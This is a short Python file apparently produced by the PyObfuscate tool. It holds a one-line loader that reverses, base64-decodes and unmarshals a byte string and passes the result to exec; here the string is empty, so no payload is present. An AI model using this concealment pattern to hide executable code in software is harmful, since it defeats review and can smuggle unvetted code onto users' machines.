# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Fri Nov 24 11:23:46 2023
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))